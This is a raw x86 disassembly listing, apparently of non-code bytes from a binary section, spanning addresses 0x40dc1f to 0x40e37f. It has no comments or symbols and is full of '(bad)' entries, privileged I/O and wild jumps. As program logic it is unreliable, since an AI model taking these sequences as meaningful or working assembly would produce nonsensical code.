  40dc1f:	or     bh,BYTE PTR [edx]
  40dc21:	stc    
  40dc22:	jg     0x40dc29
  40dc24:	mov    edi,0x2195d1b2
  40dc29:	jne    0x40dc4a
  40dc2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc2c:	jmp    0x40dc59
  40dc2e:	ins    BYTE PTR es:[edi],dx
  40dc2f:	push   esp
  40dc30:	in     eax,dx
  40dc31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc32:	ins    BYTE PTR es:[edi],dx
  40dc33:	mov    edi,0xee43ea41
  40dc38:	sbb    al,0x5f
  40dc3a:	xchg   edi,eax
  40dc3b:	mov    esi,0xf3d63c95
  40dc40:	inc    ebx
  40dc41:	fcomp  QWORD PTR [ebp-0x133e1b1a]
  40dc47:	leave  
  40dc48:	imul   ebp,DWORD PTR [esp],0xfe33fca1
  40dc4f:	aas    
  40dc50:	ret    
  40dc51:	push   esp
  40dc52:	mov    ch,BYTE PTR [edi+0x1ad76f0d]
  40dc58:	dec    esp
  40dc59:	xchg   ebx,eax
  40dc5a:	mov    esi,0xa349715c
  40dc5f:	mov    bh,0x16
  40dc61:	int    0xbd
  40dc63:	pop    ds
  40dc64:	mov    ?,WORD PTR [eax+ebp*4]
  40dc67:	lods   al,BYTE PTR ds:[esi]
  40dc68:	dec    eax
  40dc69:	out    dx,al
  40dc6a:	out    0x68,eax
  40dc6c:	je     0x40dcc7
  40dc6e:	test   eax,0xe0bfb6e8
  40dc73:	mov    eax,DWORD PTR [eax]
  40dc75:	xchg   DWORD PTR [edx-0x6c],edx
  40dc78:	jnp    0x40dc04
  40dc7a:	sbb    eax,0x7c29fe9
  40dc7f:	into   
  40dc80:	mov    edx,0x44f7f28a
  40dc85:	lahf   
  40dc86:	int3   
  40dc87:	inc    eax
  40dc88:	dec    ecx
  40dc89:	push   ebx
  40dc8a:	das    
  40dc8b:	push   ss
  40dc8c:	and    dh,cl
  40dc8e:	xor    al,0xff
  40dc90:	ja     0x40dcbf
  40dc92:	out    0xca,al
  40dc94:	and    ah,cl
  40dc96:	std    
  40dc97:	(bad)  
  40dc98:	in     al,0xaf
  40dc9a:	mov    ?,WORD PTR [ecx+edi*8]
  40dc9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc9e:	xor    DWORD PTR [esi-0x19ead722],0xffffffbd
  40dca5:	test   ecx,ebp
  40dca7:	pop    esi
  40dca8:	xor    al,0x8b
  40dcaa:	and    al,0xfd
  40dcac:	push   es
  40dcad:	imul   esp,ecx,0x46
  40dcb0:	in     eax,dx
  40dcb1:	aaa    
  40dcb2:	sub    DWORD PTR [ecx+0x41],0x488da1f1
  40dcb9:	sbb    edx,edx
  40dcbb:	xor    eax,0x3ec407f4
  40dcc0:	stc    
  40dcc1:	pop    edi
  40dcc2:	(bad)  
  40dcc3:	call   0xf660d0b7
  40dcc8:	nop
  40dcc9:	mov    edx,0x5f53782c
  40dcce:	xchg   ebx,eax
  40dccf:	(bad)  
  40dcd0:	mov    edx,0x7da11ed3
  40dcd5:	out    dx,al
  40dcd6:	ins    BYTE PTR es:[edi],dx
  40dcd7:	xchg   esp,eax
  40dcd8:	cdq    
  40dcd9:	xchg   ebp,eax
  40dcda:	push   es
  40dcdb:	mov    DWORD PTR [esi-0x7a9c7f70],ebx
  40dce1:	lea    ecx,[ecx-0x504b7797]
  40dce7:	sub    esi,DWORD PTR [ecx+0x12]
  40dcea:	xchg   ecx,eax
  40dceb:	jmp    0x8de91396
  40dcf0:	lods   al,BYTE PTR ds:[esi]
  40dcf1:	imul   esp,edi,0x72dcf3b3
  40dcf7:	ds in  eax,dx
  40dcf9:	xor    al,0x38
  40dcfb:	fild   WORD PTR [edi-0x2d]
  40dcfe:	push   0xc
  40dd00:	in     eax,dx
  40dd01:	adc    eax,0x9662ded7
  40dd06:	jle    0x40dd68
  40dd08:	cli    
  40dd09:	jl     0x40dd5b
  40dd0b:	adc    ebx,ebx
  40dd0d:	sbb    ecx,DWORD PTR [ebp-0x35]
  40dd10:	pop    ebp
  40dd11:	mov    ecx,0x65b9b0b6
  40dd16:	mov    bl,al
  40dd18:	jno    0x40dcb6
  40dd1a:	mov    esp,0xe7597b37
  40dd1f:	xchg   edx,eax
  40dd20:	jae    0x40dd56
  40dd22:	repz arpl WORD PTR [esi],bx
  40dd25:	je     0x40dda2
  40dd27:	ret    
  40dd28:	jl     0x40dccf
  40dd2a:	inc    ebp
  40dd2b:	or     DWORD PTR [eax],esp
  40dd2d:	pop    eax
  40dd2e:	mov    ebx,0xb3208574
  40dd33:	sub    DWORD PTR [esp+edi*1],esp
  40dd36:	mov    es,WORD PTR [esi+0x710ed9cc]
  40dd3c:	ret    
  40dd3d:	daa    
  40dd3e:	fwait
  40dd3f:	lods   eax,DWORD PTR ds:[esi]
  40dd40:	sbb    eax,0x87d3bda0
  40dd45:	xchg   BYTE PTR [ebp+0x20],al
  40dd48:	adc    al,0x5c
  40dd4a:	or     eax,0x58127fa6
  40dd4f:	inc    esi
  40dd50:	aas    
  40dd51:	std    
  40dd52:	xchg   edx,eax
  40dd53:	mov    esi,ecx
  40dd55:	jno    0x40dd26
  40dd57:	inc    edi
  40dd58:	data16 (bad) 
  40dd5a:	leave  
  40dd5b:	xchg   esi,eax
  40dd5c:	add    esp,DWORD PTR [ebx]
  40dd5e:	int    0x48
  40dd60:	push   es
  40dd61:	add    dh,ah
  40dd63:	arpl   WORD PTR [edi+0x259c0629],bp
  40dd69:	jno    0x40ddaf
  40dd6b:	mov    eax,0x5760d0a9
  40dd70:	xchg   edi,eax
  40dd71:	lea    esi,[ecx+0x4d34b9f3]
  40dd77:	repnz nop
  40dd79:	inc    esi
  40dd7a:	mov    ?,WORD PTR [eax-0xa]
  40dd7d:	aaa    
  40dd7e:	cld    
  40dd7f:	mov    eax,ds:0xaa8e61d9
  40dd84:	add    eax,ebx
  40dd86:	sbb    ecx,DWORD PTR [ecx-0x2d]
  40dd89:	xchg   edx,eax
  40dd8a:	adc    eax,0xb0082972
  40dd8f:	sub    BYTE PTR [esi],cl
  40dd91:	sbb    eax,0xeb4db185
  40dd96:	and    cl,bl
  40dd98:	icebp  
  40dd99:	addr16 pop edi
  40dd9b:	push   ebp
  40dd9c:	leave  
  40dd9d:	cmc    
  40dd9e:	cmp    BYTE PTR [ebx-0x3408f1c2],dh
  40dda4:	jb     0x40de0b
  40dda6:	sbb    DWORD PTR [eax],eax
  40dda8:	(bad)  
  40dda9:	cmp    BYTE PTR [ecx+0x5b34f720],ah
  40ddaf:	pusha  
  40ddb0:	mov    bh,0x32
  40ddb2:	repz sub bl,bh
  40ddb5:	ror    DWORD PTR [ebp-0x57],1
  40ddb8:	sar    DWORD PTR [edi+0x2a],0x3
  40ddbc:	xchg   edi,eax
  40ddbd:	inc    esi
  40ddbe:	dec    ebp
  40ddbf:	pushf  
  40ddc0:	(bad)  
  40ddc2:	test   al,0x13
  40ddc4:	out    dx,al
  40ddc5:	enter  0xfe55,0x9b
  40ddc9:	xor    DWORD PTR [eax-0x2e759971],edi
  40ddcf:	push   edx
  40ddd0:	pop    edx
  40ddd1:	aad    0x65
  40ddd3:	adc    eax,0xb952b10b
  40ddd8:	and    DWORD PTR [ebp-0x38b409bd],esp
  40ddde:	ss jmp 0x973451b8
  40dde4:	dec    ebp
  40dde5:	imul   esi,DWORD PTR [ecx],0x84c55fe8
  40ddeb:	cmc    
  40ddec:	push   ecx
  40dded:	imul   ebx,ebx,0xfffffff3
  40ddf0:	sar    ah,0x3b
  40ddf3:	push   ebx
  40ddf4:	xchg   ebp,eax
  40ddf5:	imul   esi,DWORD PTR [edi+0x1871fab0],0x98b034a0
  40ddff:	inc    edx
  40de00:	or     dl,cl
  40de02:	cmp    ah,al
  40de04:	jmp    0x40de23
  40de06:	inc    ebp
  40de07:	jne    0x40dd9b
  40de09:	add    al,0x3d
  40de0b:	mov    al,0xc2
  40de0d:	mov    ecx,0xb4d84d65
  40de12:	add    al,BYTE PTR [edi+0x1f]
  40de15:	loop   0x40de4d
  40de17:	jl     0x40ddc4
  40de19:	inc    eax
  40de1a:	fcmovu st,st(6)
  40de1c:	dec    ebx
  40de1d:	icebp  
  40de1e:	mov    dh,0x8d
  40de20:	enter  0x972e,0x7c
  40de24:	rcl    DWORD PTR [edi+edx*1+0x404de5de],1
  40de2b:	mov    bh,0x7f
  40de2d:	dec    edi
  40de2e:	pop    ss
  40de2f:	fist   DWORD PTR [ecx]
  40de31:	xor    ecx,0xffffffa7
  40de34:	out    dx,eax
  40de35:	mov    ah,0x9
  40de37:	cmp    al,0xa4
  40de39:	retf   
  40de3a:	out    0x49,al
  40de3c:	imul   ecx,ebx,0x29
  40de3f:	das    
  40de40:	lock pop ecx
  40de42:	ss xchg edx,eax
  40de44:	neg    esp
  40de46:	in     eax,dx
  40de47:	int3   
  40de48:	lock ret 
  40de4a:	jp     0x40de2d
  40de4c:	xchg   DWORD PTR [edi-0x1e4525d4],eax
  40de52:	inc    edi
  40de53:	and    dh,BYTE PTR [ebp+0xb518aa8]
  40de59:	mov    edi,0xaff25151
  40de5e:	outs   dx,DWORD PTR ds:[esi]
  40de5f:	div    ch
  40de61:	dec    DWORD PTR [edi+ebp*2-0x768d3a32]
  40de68:	pop    eax
  40de69:	xchg   esp,eax
  40de6a:	pop    es
  40de6b:	sub    eax,0x4a9e5a77
  40de70:	pop    esi
  40de71:	jmp    0x5fc8:0x847dff27
  40de78:	push   ebx
  40de79:	mov    ch,cl
  40de7b:	imul   edi,DWORD PTR [ecx+ecx*4],0x4eb369b9
  40de82:	mov    ebx,0x315a7ee9
  40de87:	pop    esp
  40de88:	xchg   ebx,eax
  40de89:	mov    eax,eax
  40de8b:	dec    ebx
  40de8c:	data16 sahf 
  40de8e:	add    al,0x19
  40de90:	add    BYTE PTR [ebp-0x341f16af],ch
  40de96:	gs push esi
  40de98:	mov    eax,0xad0d2cc3
  40de9d:	test   BYTE PTR [ebp-0x4e],dh
  40dea0:	retf   0x5647
  40dea3:	(bad)  
  40dea4:	nop
  40dea5:	and    DWORD PTR [ecx-0x2f],edi
  40dea8:	jg     0x40ded6
  40deaa:	cs cmp al,0xaf
  40dead:	pop    ds
  40deae:	lea    edi,[ecx-0x4dd5128e]
  40deb4:	imul   BYTE PTR [edx]
  40deb6:	(bad)  
  40deb8:	es jne 0x40df0b
  40debb:	xchg   DWORD PTR [esi+0x49fa9e1b],edi
  40dec1:	add    BYTE PTR [edi+0x33],0xa
  40dec5:	leave  
  40dec6:	les    esp,FWORD PTR [edi-0x6b43124]
  40decc:	sbb    DWORD PTR [esi],edi
  40dece:	aaa    
  40decf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ded0:	or     eax,0xadf1fcd2
  40ded5:	sbb    al,0xf1
  40ded7:	sbb    ebp,ecx
  40ded9:	outs   dx,DWORD PTR ds:[esi]
  40deda:	fadd   QWORD PTR [edx-0x62]
  40dedd:	jle    0x40de84
  40dedf:	add    eax,0x94ad6cd4
  40dee4:	mov    eax,0x11ae89
  40dee9:	lds    ecx,FWORD PTR [esi+eax*8-0x4d]
  40deed:	ja     0x40df3b
  40deef:	inc    eax
  40def0:	mov    WORD PTR [ebp+edi*1+0x1f],es
  40def4:	sub    edi,ebp
  40def6:	sbb    bl,bl
  40def8:	pushf  
  40def9:	and    eax,0x8a1987a2
  40defe:	jbe    0x40defe
  40df00:	data16 data16 addr16 add ch,bl
  40df05:	xchg   edx,eax
  40df07:	mov    ecx,0x9aebe30a
  40df0c:	not    DWORD PTR [eax-0x4]
  40df0f:	xchg   ebp,eax
  40df10:	mov    WORD PTR [edx+edx*2+0x6b780b99],ss
  40df17:	int3   
  40df18:	jl     0x40df91
  40df1a:	jae    0x40def0
  40df1c:	fistp  WORD PTR [ebp+0x782a8e1a]
  40df22:	sub    BYTE PTR [ecx-0x35],bl
  40df25:	stos   DWORD PTR es:[edi],eax
  40df26:	aas    
  40df27:	mov    ds:0xd299ccad,al
  40df2c:	lds    ebp,FWORD PTR [edx-0x52]
  40df2f:	push   ss
  40df30:	jo     0x40def2
  40df32:	or     BYTE PTR [edx],ch
  40df34:	add    ah,dl
  40df36:	mov    dh,0xe7
  40df38:	into   
  40df39:	mov    ds:0x32bfac6a,al
  40df3e:	sub    bl,dh
  40df40:	inc    edi
  40df41:	inc    esp
  40df42:	inc    ebx
  40df43:	push   ss
  40df44:	std    
  40df45:	cmp    BYTE PTR [esi],dh
  40df47:	or     DWORD PTR [esi],edi
  40df49:	hlt    
  40df4a:	inc    eax
  40df4b:	leave  
  40df4c:	shr    DWORD PTR [edi-0x5f],cl
  40df4f:	sti    
  40df50:	jno    0x40df7f
  40df52:	pop    edi
  40df53:	(bad)  
  40df54:	pop    ss
  40df55:	stos   BYTE PTR es:[edi],al
  40df56:	fild   WORD PTR [eax]
  40df58:	outs   dx,BYTE PTR ds:[esi]
  40df59:	mov    ch,0x9c
  40df5b:	sub    DWORD PTR [esi+0x5456b365],ebx
  40df61:	in     al,0x24
  40df63:	fsubr  DWORD PTR [edx+0x2b6c6d30]
  40df69:	sub    ebx,ecx
  40df6b:	dec    ebx
  40df6c:	cmp    bl,dh
  40df6e:	inc    esi
  40df6f:	xor    al,0x17
  40df71:	test   DWORD PTR [ebx],0x889ff7db
  40df77:	sbb    BYTE PTR [eax+0x6d6478bd],ch
  40df7d:	adc    eax,0x65397273
  40df82:	outs   dx,DWORD PTR ds:[esi]
  40df83:	xchg   ecx,eax
  40df84:	loop   0x40dffb
  40df86:	pop    ss
  40df87:	and    eax,DWORD PTR [esp+ebx*4-0x21d0cf48]
  40df8e:	jae    0x40df9c
  40df90:	ret    
  40df91:	pusha  
  40df92:	push   0xfa76dc82
  40df97:	cmp    BYTE PTR [edi+eax*1+0x11c43e9d],al
  40df9e:	lock pop eax
  40dfa0:	mov    esi,0x3a4a7eb1
  40dfa5:	push   ecx
  40dfa6:	dec    edi
  40dfa7:	(bad)  [ebp-0x77a5e034]
  40dfad:	into   
  40dfae:	jmp    DWORD PTR [esi+0x2388dd15]
  40dfb4:	stc    
  40dfb5:	lock repz dec edx
  40dfb8:	retf   
  40dfb9:	sub    ebp,DWORD PTR [eax]
  40dfbb:	dec    eax
  40dfbc:	xor    BYTE PTR [ebp+0x162a05b2],ch
  40dfc2:	inc    DWORD PTR [ebp-0x54]
  40dfc5:	jb     0x40df6e
  40dfc7:	push   ss
  40dfc8:	pop    ebp
  40dfc9:	jmp    0x40dfe8
  40dfcb:	lods   eax,DWORD PTR ds:[esi]
  40dfcc:	push   edx
  40dfcd:	xchg   DWORD PTR [edx+edi*2],edx
  40dfd0:	ror    ah,cl
  40dfd2:	mov    eax,0x7eba2531
  40dfd7:	fisttp DWORD PTR [eax]
  40dfd9:	push   eax
  40dfda:	cwde   
  40dfdb:	daa    
  40dfdc:	sbb    DWORD PTR [edx+0x6],edx
  40dfdf:	jo     0x40dfdc
  40dfe1:	ins    DWORD PTR es:[edi],dx
  40dfe2:	test   BYTE PTR [edi+0x73e86dfe],bh
  40dfe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfe9:	nop
  40dfea:	push   0xa2d36b33
  40dfef:	push   edx
  40dff0:	in     al,0xea
  40dff2:	js     0x40e02b
  40dff4:	call   0x89604e15
  40dff9:	push   ebx
  40dffa:	sbb    bl,BYTE PTR [eax+0x2c33ef61]
  40e000:	xchg   esp,eax
  40e001:	or     BYTE PTR [esi+0x2ef76d6],cl
  40e007:	adc    ebp,DWORD PTR [edx]
  40e009:	fisttp DWORD PTR [eax+0x67be800a]
  40e00f:	xor    al,ch
  40e011:	mov    cr5,eax
  40e014:	xor    al,0x4c
  40e016:	xor    eax,0x30e95401
  40e01b:	xchg   ebp,eax
  40e01c:	pop    es
  40e01d:	les    ecx,FWORD PTR [edi+ecx*1+0x3ec9ade7]
  40e024:	sahf   
  40e025:	scas   eax,DWORD PTR es:[edi]
  40e026:	fistp  WORD PTR [ecx+0x719f9ab6]
  40e02c:	push   ss
  40e02d:	test   DWORD PTR [esi+ebx*8+0x5e2dd374],eax
  40e034:	(bad)  
  40e035:	jo     0x40e006
  40e037:	clc    
  40e038:	cmp    esi,esi
  40e03a:	push   esp
  40e03b:	jne    0x40e09b
  40e03d:	scas   al,BYTE PTR es:[edi]
  40e03e:	sbb    DWORD PTR [ebx],ecx
  40e040:	xchg   ebp,eax
  40e041:	test   al,0x47
  40e043:	daa    
  40e044:	jns    0x40e09f
  40e046:	div    BYTE PTR [esi-0x7284e668]
  40e04c:	and    DWORD PTR [ecx+0x79],edi
  40e04f:	outs   dx,DWORD PTR ds:[esi]
  40e050:	out    dx,eax
  40e051:	jmp    0xb9e:0xb74b615c
  40e058:	xchg   esp,eax
  40e059:	les    edx,FWORD PTR [ebx]
  40e05b:	and    bl,BYTE PTR [edx]
  40e05d:	push   DWORD PTR [esi]
  40e05f:	inc    ecx
  40e060:	xchg   ecx,eax
  40e061:	push   ebp
  40e062:	arpl   bx,bp
  40e064:	xchg   esi,eax
  40e065:	cmp    al,0xfc
  40e067:	jmp    0xcef9134c
  40e06c:	scas   eax,DWORD PTR es:[edi]
  40e06d:	aas    
  40e06e:	lock mov cl,0xb3
  40e071:	mov    esi,0x7a33bd84
  40e076:	mov    ecx,0xbba6d692
  40e07b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e07c:	in     al,dx
  40e07d:	lods   al,BYTE PTR ds:[esi]
  40e07e:	les    ebx,FWORD PTR [edi+ebx*1-0xca8ffd8]
  40e085:	repz mov edx,0xfe1e70e0
  40e08b:	pop    edx
  40e08c:	pop    ds
  40e08d:	ret    
  40e08e:	push   DWORD PTR [edx]
  40e090:	mov    ebp,0x4ff4a854
  40e095:	dec    esi
  40e096:	aas    
  40e097:	into   
  40e098:	push   eax
  40e099:	cs lock popa 
  40e09c:	cs fstp st(0)
  40e09f:	ins    BYTE PTR es:[edi],dx
  40e0a0:	ror    DWORD PTR [ebx],1
  40e0a2:	push   ss
  40e0a3:	adc    bl,BYTE PTR [esi-0x4839088c]
  40e0a9:	dec    edx
  40e0aa:	std    
  40e0ab:	jecxz  0x40e0b9
  40e0ad:	and    BYTE PTR [ebx],ch
  40e0af:	inc    esi
  40e0b0:	cmc    
  40e0b1:	loop   0x40e114
  40e0b3:	leave  
  40e0b4:	add    edx,ecx
  40e0b6:	dec    eax
  40e0b7:	fs or  al,0xf8
  40e0ba:	fst    DWORD PTR [ebx-0x23]
  40e0bd:	rol    DWORD PTR [ecx+0x6d401b87],1
  40e0c3:	sar    BYTE PTR [eax+0x3ccedf85],cl
  40e0c9:	or     al,0xa
  40e0cb:	shl    DWORD PTR [ebp-0x66],cl
  40e0ce:	cmp    ecx,DWORD PTR [edx]
  40e0d0:	mov    edx,0x8ad9f56d
  40e0d5:	repz out 0x53,al
  40e0d8:	push   ebx
  40e0d9:	(bad)  
  40e0da:	push   0x91f0445e
  40e0df:	jge    0x40e0b3
  40e0e1:	(bad)  
  40e0e3:	push   0x250994cb
  40e0e8:	mov    ds:0xdf83cbb,eax
  40e0ed:	lods   al,BYTE PTR ds:[esi]
  40e0ee:	jae    0x40e125
  40e0f0:	ffree  st(6)
  40e0f2:	adc    al,0x7b
  40e0f4:	xor    DWORD PTR [eax+0x19ad5158],ecx
  40e0fa:	in     eax,dx
  40e0fb:	sahf   
  40e0fc:	pop    edi
  40e0fd:	pop    es
  40e0fe:	jnp    0x40e0d2
  40e100:	imul   ecx,DWORD PTR [edx],0xb68a98e4
  40e106:	aad    0x1b
  40e108:	mov    esp,0xc49a2b38
  40e10d:	mov    bh,0xae
  40e10f:	sahf   
  40e110:	mov    bh,0x55
  40e112:	jo     0x40e0b0
  40e114:	bound  ebp,QWORD PTR [eax]
  40e116:	pop    edx
  40e117:	sub    DWORD PTR cs:[edi+0x123d62d8],edx
  40e11e:	cdq    
  40e11f:	inc    edx
  40e120:	xor    al,0xae
  40e122:	mov    esp,0xf89265aa
  40e127:	pop    edi
  40e128:	pusha  
  40e129:	jecxz  0x40e129
  40e12b:	sbb    bl,ah
  40e12d:	mov    dl,0xa5
  40e12f:	std    
  40e130:	lods   al,BYTE PTR ds:[esi]
  40e131:	sub    BYTE PTR [edx+0x7dfa98e2],dh
  40e137:	push   ecx
  40e138:	mov    fs,WORD PTR [esi+0x5c9394f5]
  40e13e:	fnstsw WORD PTR [edi+ebp*4]
  40e141:	rcr    BYTE PTR [edx],cl
  40e143:	mov    bh,0x7c
  40e145:	idiv   DWORD PTR [ecx]
  40e147:	xchg   esp,eax
  40e148:	dec    BYTE PTR [edx+0x556b603a]
  40e14e:	int    0x14
  40e150:	sbb    edi,DWORD PTR [esi+ecx*4-0x2b06fec3]
  40e157:	fidivr WORD PTR [ebx+0x55]
  40e15a:	add    bl,BYTE PTR [edi-0x2a09d8b2]
  40e160:	lods   al,BYTE PTR ds:[esi]
  40e161:	daa    
  40e162:	mov    ebp,0x8bec0c90
  40e167:	test   BYTE PTR ds:0x39168429,al
  40e16d:	mov    eax,0xd1e377d4
  40e172:	ret    
  40e173:	dec    eax
  40e174:	sbb    eax,0xffb67dd4
  40e179:	jae    0x40e1e2
  40e17b:	pushf  
  40e17c:	cs mov ebx,0x90de2675
  40e182:	and    eax,DWORD PTR [ebp-0x3b]
  40e185:	sub    BYTE PTR [edi-0x53426b58],cl
  40e18b:	test   al,0xaa
  40e18d:	or     BYTE PTR [eax+0x4d],ch
  40e190:	ja     0x40e20d
  40e192:	sbb    DWORD PTR [esi+0xb],esp
  40e195:	push   eax
  40e196:	pushf  
  40e197:	mov    bh,0xd5
  40e199:	mov    ebp,DWORD PTR [eax-0x58]
  40e19c:	inc    esp
  40e19d:	lea    ebx,[ebx]
  40e19f:	adc    DWORD PTR [ebx-0x30],ebp
  40e1a2:	(bad)  
  40e1a3:	inc    edi
  40e1a4:	popa   
  40e1a5:	mov    eax,ds:0x2c2bd917
  40e1aa:	ret    
  40e1ab:	mov    ds:0x617d3824,eax
  40e1b0:	xchg   edi,eax
  40e1b1:	cmp    edx,DWORD PTR [ecx+0x57]
  40e1b4:	ja     0x40e1ea
  40e1b6:	hlt    
  40e1b7:	jmp    0xb0d2:0xf91c9483
  40e1be:	mov    al,0x83
  40e1c0:	retf   
  40e1c1:	fwait
  40e1c2:	sbb    esp,DWORD PTR [edx-0x69905145]
  40e1c8:	pop    ds
  40e1c9:	ins    DWORD PTR es:[edi],dx
  40e1ca:	inc    eax
  40e1cb:	inc    esi
  40e1cc:	inc    esi
  40e1cd:	xchg   ecx,eax
  40e1ce:	push   es
  40e1cf:	fadd   QWORD PTR [ecx-0x44]
  40e1d2:	push   ds
  40e1d3:	je     0x40e233
  40e1d5:	sub    edi,ecx
  40e1d7:	sbb    eax,0x5d0d6b61
  40e1dc:	ds (bad) 
  40e1de:	cmp    DWORD PTR [edi+0x4a],edx
  40e1e1:	xlat   BYTE PTR ds:[ebx]
  40e1e2:	adc    BYTE PTR [edx-0xd],bh
  40e1e5:	adc    al,0x72
  40e1e7:	rcl    BYTE PTR [edx-0x4b60175d],0x2b
  40e1ee:	in     eax,dx
  40e1ef:	xor    DWORD PTR [eax],ecx
  40e1f1:	inc    eax
  40e1f2:	and    al,0x9f
  40e1f4:	(bad)  
  40e1f5:	fistp  DWORD PTR [esi]
  40e1f7:	je     0x40e187
  40e1f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1fa:	mov    al,0x42
  40e1fc:	ret    
  40e1fd:	or     BYTE PTR [ecx],dh
  40e1ff:	jecxz  0x40e1df
  40e201:	push   esi
  40e202:	adc    bl,BYTE PTR [ebp+0x763c20f1]
  40e208:	ja     0x40e1e5
  40e20a:	mov    ah,0x13
  40e20c:	jg     0x40e19e
  40e20e:	repz or DWORD PTR [edx-0x2d9efdb8],0x30
  40e216:	in     al,dx
  40e217:	xor    DWORD PTR [ebx-0x2],0x13
  40e21b:	and    bl,BYTE PTR [edx-0x26]
  40e21e:	and    DWORD PTR [ecx+0x5e],ebx
  40e221:	push   0xdee2f74b
  40e226:	sar    BYTE PTR ds:0xaf2535ca,0xf4
  40e22d:	xchg   ebp,eax
  40e22e:	stos   DWORD PTR es:[edi],eax
  40e22f:	cs mov ecx,0x6e5adbbb
  40e235:	jnp    0x40e22a
  40e237:	cld    
  40e238:	add    al,0x46
  40e23a:	add    al,BYTE PTR [ecx+eiz*8-0x6f]
  40e23e:	pop    ss
  40e23f:	fcmovnbe st,st(6)
  40e241:	pop    edi
  40e242:	in     eax,0x29
  40e244:	mov    al,ds:0x65424565
  40e249:	aad    0x7a
  40e24b:	fisttp DWORD PTR [edi]
  40e24d:	push   0xffffffe0
  40e24f:	jecxz  0x40e1e8
  40e251:	xor    BYTE PTR [esi],ch
  40e253:	aam    0x76
  40e255:	in     al,0xba
  40e257:	and    ecx,esp
  40e259:	cmp    eax,0x37af8080
  40e25e:	int3   
  40e25f:	jp     0x40e262
  40e261:	xchg   DWORD PTR [edx-0x5f216b05],eax
  40e267:	fld    QWORD PTR [ebp+0x59ecec25]
  40e26d:	cld    
  40e26e:	sbb    al,0x4
  40e270:	dec    edx
  40e271:	and    cl,BYTE PTR [edi]
  40e273:	int3   
  40e274:	xchg   esi,eax
  40e275:	push   ebp
  40e276:	les    ebx,FWORD PTR [edi+0x4734473f]
  40e27c:	jmp    0x40e216
  40e27e:	xor    DWORD PTR [edx+0x7f525da],ebp
  40e284:	xchg   esp,ebp
  40e286:	rcl    DWORD PTR [eax+0x1b8d08e],cl
  40e28c:	loope  0x40e2aa
  40e28e:	cmc    
  40e28f:	in     eax,dx
  40e290:	out    dx,eax
  40e291:	into   
  40e292:	jle    0x40e2fb
  40e294:	inc    esp
  40e295:	mov    eax,0xaf2f5214
  40e29a:	mov    esp,0x8d8307a8
  40e29f:	outs   dx,DWORD PTR ds:[esi]
  40e2a0:	sbb    cl,BYTE PTR [edx+0xf]
  40e2a3:	jne    0x40e2fc
  40e2a5:	outs   dx,DWORD PTR ds:[esi]
  40e2a6:	sbb    al,0xdd
  40e2a8:	scas   eax,DWORD PTR es:[edi]
  40e2a9:	jge    0x40e2c8
  40e2ab:	aas    
  40e2ac:	mov    eax,ds:0x1539797f
  40e2b1:	jb     0x40e273
  40e2b3:	sub    al,0xae
  40e2b5:	stos   BYTE PTR es:[edi],al
  40e2b6:	mov    dh,0x12
  40e2b8:	je     0x40e2c3
  40e2ba:	mov    WORD PTR [esi-0x75],?
  40e2bd:	shr    DWORD PTR [ecx],cl
  40e2bf:	push   0x1b
  40e2c1:	scas   al,BYTE PTR es:[edi]
  40e2c2:	test   al,0xf9
  40e2c4:	ror    esi,1
  40e2c6:	pop    esi
  40e2c7:	push   esi
  40e2c8:	or     edx,DWORD PTR [esi+ebx*1-0x16136d74]
  40e2cf:	div    BYTE PTR [eax]
  40e2d1:	mov    al,0x37
  40e2d3:	repz jl 0x40e28e
  40e2d6:	mov    edi,0xd1b393d6
  40e2db:	push   cs
  40e2dc:	sub    BYTE PTR [esi-0x4b6275c5],bl
  40e2e2:	popf   
  40e2e3:	lods   al,BYTE PTR ds:[esi]
  40e2e4:	mov    cl,0xdf
  40e2e6:	add    DWORD PTR [ebp-0x6eea5016],esp
  40e2ec:	push   ss
  40e2ed:	mov    eax,0xe8b49198
  40e2f2:	fs inc eax
  40e2f4:	fisubr WORD PTR [ebx+0x30c1a322]
  40e2fa:	and    eax,0xee689b6a
  40e2ff:	test   BYTE PTR es:[edi+0x8],dl
  40e303:	lods   eax,DWORD PTR ds:[esi]
  40e304:	jecxz  0x40e2d4
  40e306:	jmp    edx
  40e308:	pop    esi
  40e309:	jbe    0x40e2de
  40e30b:	loop   0x40e2c7
  40e30d:	cli    
  40e30e:	loop   0x40e342
  40e310:	push   ds
  40e311:	mov    ecx,0xbc352ecf
  40e316:	and    dh,BYTE PTR [eax]
  40e318:	in     al,dx
  40e319:	sub    eax,0x1cc266cf
  40e31e:	nop
  40e31f:	outs   dx,BYTE PTR ds:[esi]
  40e320:	xchg   DWORD PTR [ecx],ebp
  40e322:	push   es
  40e323:	xor    al,0xc
  40e325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e326:	pushf  
  40e327:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40e329:	scas   eax,DWORD PTR es:[edi]
  40e32a:	ret    0x9c82
  40e32d:	jne    0x40e37d
  40e32f:	xchg   BYTE PTR [esi],bl
  40e331:	mov    ebx,0xef398aae
  40e336:	sub    ah,BYTE PTR [ecx+0x4aea2a1d]
  40e33c:	lods   al,BYTE PTR ds:[esi]
  40e33d:	data16 jg 0x40e335
  40e340:	loope  0x40e3bd
  40e342:	push   es
  40e343:	loopne 0x40e323
  40e345:	mov    cl,0xaa
  40e347:	push   0x5c
  40e349:	adc    BYTE PTR [ebx],dl
  40e34b:	lahf   
  40e34c:	call   0x9632:0xee92713c
  40e353:	shl    edi,1
  40e355:	mov    ch,0x73
  40e357:	aas    
  40e358:	cmp    bl,BYTE PTR [ecx-0x20]
  40e35b:	xor    ebx,DWORD PTR [ecx+0x3cb9ac52]
  40e361:	in     eax,0x61
  40e363:	das    
  40e364:	mov    eax,0xee17e931
  40e369:	inc    edx
  40e36a:	mov    ebp,cs
  40e36c:	adc    ch,dh
  40e36e:	pop    cx
  40e370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e371:	xchg   ebx,eax
  40e372:	mov    bh,0x6e
  40e374:	test   BYTE PTR [ebp+0x3654e2a5],dh
  40e37a:	pop    ss
  40e37b:	lahf   
  40e37c:	into   
  40e37d:	xchg   ebx,eax
  40e37e:	push   eax
  40e37f:	jmp    0x40e3e9
